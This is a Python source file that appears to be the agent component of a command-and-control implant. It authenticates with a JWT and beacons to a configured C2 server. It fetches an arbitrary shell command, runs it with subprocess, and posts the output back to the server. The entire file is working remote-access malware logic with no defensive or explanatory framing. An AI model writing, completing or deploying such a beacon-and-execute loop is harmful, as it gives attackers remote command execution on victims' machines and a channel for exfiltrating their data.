import subprocess
import requests
from config import *
from identity import *

def beacon_and_execute():
    session = initialize_agent()
    jwt_token = session["jwt"]
    agent_id = session["agent_id"]

    headers = {"Authorization": f"Bearer {jwt_token}"}
    beacon_data = {"agent_id": agent_id}

    #Check for task
    resp = requests.post(f"{C2_URL}{BEACON_ENDPOINT}", json=beacon_data, headers=headers)
    task = resp.json()

    if not task.get("command"):
        print("[*] No task received.")
        return

    command = task["command"]
    task_id = task["task_id"]
    print(f"[+] Executing task: {command}")

    #Execute
    try:
        output = subprocess.getoutput(command)
    except Exception as e:
        output = f"[ERROR] {str(e)}"

    #Return result
    result_data = {
        "agent_id": agent_id,
        "task_id": task_id,
        "output": output
    }
    requests.post(f"{C2_URL}{RESULT_ENDPOINT}", json=result_data, headers=headers)
